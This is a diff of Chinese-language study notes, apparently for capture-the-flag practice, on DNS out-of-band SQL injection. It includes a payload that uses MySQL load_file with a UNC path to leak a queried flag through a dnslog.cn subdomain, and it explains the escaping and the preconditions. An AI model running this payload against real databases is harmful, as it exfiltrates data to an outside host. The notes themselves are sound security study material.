@@ -9,9 +9,10 @@ select * from user where id='参数';
 
 带外注入
 dns带外注入:
+需要权限和dns53端口开启
 select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog.cn\\a'));
+'\\\\'sql转义为\\,\a转义为\a,拼接结果为\\flag{xxx}.xxx.dnslog.cn\a
 `191981093114514`反引号会将内部元素转化为select之类的sql标识,以免查询表格时将表格名当成数值查找
-需要权限和dns53端口开启,'\\\\'sql转义为\\,\a转义为\a,拼接结果为\\flag{xxx}.xxx.dnslog.cn\a
 利用 Windows UNC共享路径\\主机名\资源的特性:MySQL 调用load_file()读取该路径时,会先对主机名发起DNS解析请求
 把查询数据拼在子域名,DNS日志平台记录解析请求,拿到数据。(linux不稳定一般不用dns注入)
 
